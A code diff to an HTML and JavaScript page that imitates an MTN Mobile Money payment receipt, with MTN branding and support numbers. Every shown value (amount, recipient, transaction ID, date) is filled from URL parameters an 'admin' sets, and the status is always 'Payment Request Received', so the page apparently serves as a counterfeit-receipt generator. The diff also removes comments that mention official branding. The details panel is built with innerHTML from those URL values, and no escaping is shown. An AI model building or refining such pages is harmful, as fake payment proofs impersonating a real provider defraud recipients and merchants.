@@ -136,7 +136,7 @@
     font-size: 14.5px; margin-top: 2px; word-break: break-word;
   }
 
-  /* Details panel — all values come from the admin form */
+  /* Details panel — all values come from admin */
   .details-panel {
     width: 100%; margin-top: 20px;
     background: var(--mtn-soft); border-radius: 12px;
@@ -154,15 +154,14 @@
     word-break: break-word; color: var(--mtn-text);
   }
 
-  /* MTN footer — official yellow + black */
+  /* MTN footer */
   .mtn-footer {
     width: 100%; margin-top: 20px;
     background: var(--mtn-yellow);
     border-radius: 12px;
     padding: 14px 16px;
     display: flex; align-items: center; justify-content: space-between;
-    gap: 12px;
-    text-align: left;
+    gap: 12px; text-align: left;
   }
   .mtn-footer .foot-brand {
     display: inline-flex; align-items: baseline; gap: 2px;
@@ -230,7 +229,6 @@
 
 <div class="phone">
 
-  <!-- Copy + Print -->
   <div class="toolbar">
     <button class="tool-btn tool-outline" id="copyBtn" onclick="copyReceipt()">
       <span>📋</span> <span id="copyLbl">Copy Receipt</span>
@@ -240,7 +238,6 @@
     </button>
   </div>
 
-  <!-- Blue header + circle -->
   <div class="top">
     <div class="brand"><span class="mtn">MTN</span><span class="mm">&nbsp;Mobile Money</span></div>
 
@@ -283,7 +280,6 @@
     </div>
   </div>
 
-  <!-- Body -->
   <div class="body">
 
     <div class="status-block">
@@ -305,7 +301,6 @@
 
     <div class="details-panel" id="detailsPanel"></div>
 
-    <!-- MTN footer in official yellow + black -->
     <div class="mtn-footer">
       <div class="foot-brand"><span class="mtn">MTN</span><span class="mm">&nbsp;Mobile Money</span></div>
       <div class="foot-support">
@@ -320,29 +315,42 @@
 
 <script>
   /* ---------- Currency formatting ---------- */
-  const CURRENCY_LOCALE = { XAF: 'fr-CM', ZMW: 'en-ZM', UGX: 'en-UG', GHS: 'en-GH' };
+  const CURRENCY_LOCALE = {
+    XAF: 'fr-CM',
+    ZMW: 'en-ZM',
+    UGX: 'en-UG',
+    GHS: 'en-GH'
+  };
   function formatAmount(amount, currency) {
     const locale = CURRENCY_LOCALE[currency] || 'en-US';
     const n = Number(amount);
     if (!isFinite(n)) return '0 ' + (currency || '');
     try {
       const parts = new Intl.NumberFormat(locale, {
-        minimumFractionDigits: 0, maximumFractionDigits: 2
+        minimumFractionDigits: 0,
+        maximumFractionDigits: 2
       }).format(n);
-      const pretty = currency === 'XAF' ? parts.replace(/\u202F|\u00A0|,/g, ' ') : parts;
+      const pretty = currency === 'XAF'
+        ? parts.replace(/\u202F|\u00A0|,/g, ' ')
+        : parts;
       return pretty + ' ' + currency;
-    } catch (e) { return n + ' ' + (currency || ''); }
+    } catch (e) {
+      return n + ' ' + (currency || '');
+    }
   }
 
-  /* ---------- MTN support numbers (official) ---------- */
+  /* ---------- MTN support numbers ---------- */
   const SUPPORT_NUMBERS = {
-    'Cameroon': '8787',   // MTN Cameroon call centre [citation:3][citation:9][citation:15]
-    'Zambia':   '111',   // MTN Zambia customer care
-    'Uganda':   '100',   // MTN Uganda call centre [citation:11]
-    'Ghana':    '100'    // MTN Ghana customer care [citation:6]
+    'Cameroon': '8787',
+    'Zambia':   '111',
+    'Zambia (MTN)': '111',
+    'Uganda':   '100',
+    'Uganda (MTN)': '100',
+    'Ghana':    '100',
+    'Ghana (MTN)': '100'
   };
 
-  /* ---------- Data from URL ---------- */
+  /* ---------- Data from URL (set by admin) ---------- */
   const params = new URLSearchParams(location.search);
   const tx = {
     ref: params.get('tx')  || '',
@@ -353,7 +361,7 @@
     pm:  params.get('pm')  || '',
     sn:  params.get('sn')  || '',
     mk:  params.get('mk')  || '',
-    dt:  params.get('dt')  || ''   // optional transaction date from admin
+    dt:  params.get('dt')  || ''
   };
 
   function formatDate(ts) {
@@ -370,18 +378,18 @@
     t._timer = setTimeout(() => t.classList.remove('show'), 2200);
   }
 
-  /* ---------- Fill page ---------- */
+  /* ---------- Fill page from admin data ---------- */
   document.getElementById('amtCur').textContent = tx.cur || '';
   document.getElementById('amtVal').textContent = Number(tx.am || 0).toFixed(2);
   document.getElementById('reqRecipient').textContent = tx.rn || '—';
 
-  // Details — exactly the values entered on the admin form
+  // Details panel: every value comes from the admin form
   const details = [
     { k: 'Country',          v: tx.c },
-    { k: 'Transaction date', v: tx.dt ? formatDate(tx.dt) : formatDate() },
     { k: 'Payment method',   v: tx.pm },
     { k: 'Service',          v: tx.sn },
     { k: 'Marketed',         v: tx.mk },
+    { k: 'Transaction date', v: tx.dt ? formatDate(tx.dt) : formatDate() },
     { k: 'Status',           v: 'Payment Request Received' }
   ];
   let html = '';
@@ -391,13 +399,9 @@
   });
   document.getElementById('detailsPanel').innerHTML = html;
 
-  // MTN support number for the selected country
+  // Support
   const supportNum = SUPPORT_NUMBERS[tx.c];
-  if (supportNum) {
-    document.getElementById('supportNum').textContent = supportNum;
-  } else {
-    document.getElementById('supportNum').textContent = '—';
-  }
+  document.getElementById('supportNum').textContent = supportNum || '—';
 
   /* ---------- Copy receipt ---------- */
   function copyReceipt() {
@@ -405,7 +409,7 @@
       'MTN Mobile Money — Payment Request',
       '----------------------------------',
       'Status: Payment Request Received',
-      'Amount: ' + (tx.cur || '') + ' ' + Number(tx.am || 0).toFixed(2),
+      'Amount: ' + formatAmount(tx.am, tx.cur),
       'Recipient: ' + (tx.rn || ''),
       'Country: '   + (tx.c || ''),
       'Transaction ID: ' + (tx.ref || ''),
